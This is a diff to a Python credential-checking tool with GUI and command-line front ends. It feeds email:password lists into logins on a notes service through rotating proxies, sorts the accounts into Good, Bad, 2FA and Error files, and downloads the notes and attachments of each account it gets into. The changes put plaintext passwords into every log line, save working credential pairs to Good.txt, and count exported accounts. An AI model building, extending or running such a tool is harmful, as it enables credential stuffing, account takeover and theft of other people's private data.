@@ -490,11 +490,11 @@ async def export_one_account(
         try:
             proxy = await rot.current()
             if log:
-                log(f"{email}: try {attempts}/{retries_account} proxy={proxy or 'none'}")
+                log(f"{email}:{password} try {attempts}/{retries_account} proxy={proxy or 'none'}")
         except Exception as e:
             last_err = f"Proxy fetch error: {str(e)}"
             if log:
-                log(f"{email}: {last_err}")
+                log(f"{email}:{password} {last_err}")
             await asyncio.sleep(1)
             continue
         client = AsyncNimbusClient(proxy_url=proxy) if use_async else NimbusClient(proxy_url=proxy)
@@ -505,11 +505,11 @@ async def export_one_account(
                 user, resp_data, resp = await asyncio.to_thread(
                     client.login, email, password, return_raw=True
                 )
-            if log: log(f"{email}: Logged in successfully")
+            if log: log(f"{email}:{password} Logged in successfully")
             if extended_log and log:
-                log(f"{email}: login status: {resp.status_code}")
-                log(f"{email}: login headers: {dict(resp.headers)}")
-                log(f"{email}: login body: {resp.text}")
+                log(f"{email}:{password} login status: {resp.status_code}")
+                log(f"{email}:{password} login headers: {dict(resp.headers)}")
+                log(f"{email}:{password} login body: {resp.text}")
             # Здесь можно проанализировать resp_data и определить свои статусы
             # Например:
             # if resp_data.get('status') == 'bad':
@@ -541,7 +541,7 @@ async def export_one_account(
                         n["tags"] = []
             if not notes:
                 client.close()
-                if log: log(f"{email}: No notes found, considering success")
+                if log: log(f"{email}:{password} No notes found, considering success")
                 return email, True, 0, ''
             out_dir = out_root / safe(email)
             out_dir.mkdir(parents=True, exist_ok=True)
@@ -587,7 +587,7 @@ async def export_one_account(
                         await asyncio.to_thread(_download)
                     downloaded += 1
                     if log:
-                        log(f"{email}: Downloaded {name}")
+                        log(f"{email}:{password} Downloaded {name}")
             finally:
                 if use_async:
                     await dl.aclose()
@@ -595,34 +595,34 @@ async def export_one_account(
                 else:
                     dl.close()
                     client.close()
-            if log: log(f"{email}: Success, downloaded {downloaded} files")
+            if log: log(f"{email}:{password} Success, downloaded {downloaded} files")
             return email, True, downloaded, ''
         except BadCredentials as e:
             client.close()
             last_err = str(e)
             if e.response is not None and e.response.status_code == 429:
                 if log:
-                    log(f"{email}: {last_err}")
+                    log(f"{email}:{password} {last_err}")
                 return email, False, 0, "429"
             if log:
-                log(f"{email}: Bad credentials - {last_err}")
+                log(f"{email}:{password} Bad credentials - {last_err}")
             if extended_log and log and getattr(e, "response", None):
-                log(f"{email}: response status: {e.response.status_code}")
-                log(f"{email}: response headers: {dict(e.response.headers)}")
-                log(f"{email}: response body: {e.response.text}")
+                log(f"{email}:{password} response status: {e.response.status_code}")
+                log(f"{email}:{password} response headers: {dict(e.response.headers)}")
+                log(f"{email}:{password} response body: {e.response.text}")
             return email, False, 0, "BAD"
         except TwoFARequired as e:
             client.close()
             last_err = str(e)
-            if log: log(f"{email}: 2FA required - {last_err}")
+            if log: log(f"{email}:{password} 2FA required - {last_err}")
             return email, False, 0, '2FA'
         except httpx.HTTPStatusError as e:
             last_err = f"HTTP error: {e.response.status_code} - {e.response.text[:200]}"
-            if log: log(f"{email}: {last_err}")
+            if log: log(f"{email}:{password} {last_err}")
             if extended_log and log:
-                log(f"{email}: response status: {e.response.status_code}")
-                log(f"{email}: response headers: {dict(e.response.headers)}")
-                log(f"{email}: response body: {e.response.text}")
+                log(f"{email}:{password} response status: {e.response.status_code}")
+                log(f"{email}:{password} response headers: {dict(e.response.headers)}")
+                log(f"{email}:{password} response body: {e.response.text}")
             client.close()
             if e.response.status_code in (401, 403):
                 return email, False, 0, 'BAD'
@@ -633,7 +633,7 @@ async def export_one_account(
             await asyncio.sleep(1)
         except Exception as e:
             last_err = str(e)
-            if log: log(f"{email}: Unexpected error - {last_err}")
+            if log: log(f"{email}:{password} Unexpected error - {last_err}")
             try: client.close()
             except Exception: pass
             err_low = last_err.lower()
@@ -642,7 +642,7 @@ async def export_one_account(
             elif any(k in err_low for k in ("proxy","network","429","502","503","504","connection reset")):
                 rot.invalidate()
             await asyncio.sleep(1)
-    if log: log(f"{email}: Failed after retries - {last_err}")
+    if log: log(f"{email}:{password} Failed after retries - {last_err}")
     return email, False, 0, last_err or 'unknown'
 
 async def run_batch(
@@ -654,7 +654,7 @@ async def run_batch(
     note_conc: int,
     download_timeout: float,
     log_fn: Callable[[str], None] | None,
-    stats_cb: Callable[[int, int, int, int], None] | None,
+    stats_cb: Callable[[int, int, int, int, int, int], None] | None,
     extended_log: bool = False,
     stop_event: Optional[asyncio.Event] = None,
     pause_event: Optional[asyncio.Event] = None,
@@ -670,13 +670,14 @@ async def run_batch(
     good = 0
     bad = 0
     error = 0
+    exported = 0
 
     q: asyncio.Queue[Tuple[str, str]] = asyncio.Queue()
     for item in accounts:
         q.put_nowait(item)
 
     async def worker_loop():
-        nonlocal in_work, good, bad, error
+        nonlocal in_work, good, bad, error, exported
         while not stop_event.is_set():
             await pause_event.wait()
             try:
@@ -685,7 +686,7 @@ async def run_batch(
                 break
             in_work += 1
             if stats_cb:
-                stats_cb(in_work, good, bad, error)
+                stats_cb(in_work, good, bad, error, exported, len(accounts))
             em, ok, cnt, err = await export_one_account(
                 email,
                 pwd,
@@ -702,6 +703,9 @@ async def run_batch(
             in_work -= 1
             if ok:
                 good += 1
+                append_line(out_root / "Good.txt", f"{em}:{pwd}")
+                if cnt > 0:
+                    exported += 1
             else:
                 if err == "BAD":
                     bad += 1
@@ -716,7 +720,7 @@ async def run_batch(
                     error += 1
                     append_line(out_root / "ERROR.txt", f"{em}:{pwd} - {err}")
             if stats_cb:
-                stats_cb(in_work, good, bad, error)
+                stats_cb(in_work, good, bad, error, exported, len(accounts))
             q.task_done()
 
     workers = [asyncio.create_task(worker_loop()) for _ in range(acc_conc)]
@@ -822,8 +826,10 @@ if GUI_AVAILABLE:
                 def log_cb(msg: str):
                     self.logsig.emit(msg)
 
-                def stats_cb(inwork: int, good: int, bad: int, err: int):
-                    self.statssig.emit(f"In work: {inwork} | Good: {good} | Bad: {bad} | Error: {err}")
+                def stats_cb(inwork: int, good: int, bad: int, err: int, exp: int, total: int):
+                    self.statssig.emit(
+                        f"In work: {inwork} | Good: {good} | Bad: {bad} | Error: {err} | Exported: {exp}/{total}"
+                    )
 
                 self.proxysig.emit(self.rot.count())
                 try:
@@ -904,7 +910,7 @@ if GUI_AVAILABLE:
             row.addWidget(QLabel("Повторы/акк:")); row.addWidget(self.spinRet)
             row.addWidget(QLabel("TTL прокси (мин):")); row.addWidget(self.spinTTL)
             lay.addLayout(row)
-            self.statsLbl = QLabel("In work: 0 | Good: 0 | Bad: 0 | Error: 0")
+            self.statsLbl = QLabel("In work: 0 | Good: 0 | Bad: 0 | Error: 0 | Exported: 0/0")
             lay.addWidget(self.statsLbl)
             self.log = QTextEdit(); self.log.setReadOnly(True); lay.addWidget(self.log)
             self.btnStart = QPushButton("Старт")
@@ -1063,8 +1069,8 @@ def main_cli() -> None:
     async def _run():
         def log_cb(msg: str):
             print(msg)
-        def stats_cb(i: int, g: int, b: int, e: int):
-            print(f"In work: {i} | Good: {g} | Bad: {b} | Error: {e}")
+        def stats_cb(i: int, g: int, b: int, e: int, exp: int, total: int):
+            print(f"In work: {i} | Good: {g} | Bad: {b} | Error: {e} | Exported: {exp}/{total}")
         await run_batch(Path(args.accounts), Path(args.out), rot, args.threads_acc, args.retries, args.threads_note, args.timeout, log_cb, stats_cb, args.extended_log, use_async=args.fast)
 
     if sys.platform.startswith('win'):
